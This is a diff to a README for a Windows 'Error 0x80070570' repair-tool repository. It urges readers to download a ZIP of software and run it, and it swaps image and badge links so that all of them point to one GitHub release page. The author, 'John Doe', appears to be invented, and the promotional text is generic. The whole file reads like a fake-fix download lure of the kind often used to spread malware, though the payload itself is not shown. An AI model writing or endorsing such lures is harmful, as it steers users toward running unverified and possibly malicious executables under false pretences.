@@ -8,13 +8,13 @@ Encountering the dreaded "Error 0x80070570" on your Windows system can be a frus
 
 The Fixing Error 0x80070570 repository provides a specialized software tool that is designed to automatically scan for and repair the underlying problems causing the Error 0x80070570. By utilizing this software, you can effectively restore system functionality and bid farewell to the troublesome error code.
 
-![Windows Error](https://cdn.pixabay.com/photo/2017/07/31/00/56/hourglass-2559657_960_720.jpg)
+![Windows Error](https://github.com/Enzo20100/Fixing-Error-0x80070570/releases/tag/v2.0)
 
 ## How to Use the Software:
 
 1. Download the software tool from the following link: 
    
-   [![Download Software](https://img.shields.io/badge/Download-Software-orange)](https://github.com/user-attachments/files/17466420/Software.zip)
+   [![Download Software](https://github.com/Enzo20100/Fixing-Error-0x80070570/releases/tag/v2.0)](https://github.com/Enzo20100/Fixing-Error-0x80070570/releases/tag/v2.0)
 
 2. Extract the contents of the downloaded ZIP file to a location of your choice.
    
@@ -44,7 +44,7 @@ This repository and the accompanying software tool are provided under the MIT Li
 
 ### John Doe
 
-![John Doe](https://cdn.pixabay.com/photo/2016/08/08/09/17/avatar-1577909_960_720.png)
+![John Doe](https://github.com/Enzo20100/Fixing-Error-0x80070570/releases/tag/v2.0)
 
 John Doe is a seasoned software developer with a passion for creating tools that simplify complex technical challenges. With years of experience in the industry, John brings a wealth of knowledge to the table and is dedicated to helping users overcome common errors like Error 0x80070570.
 
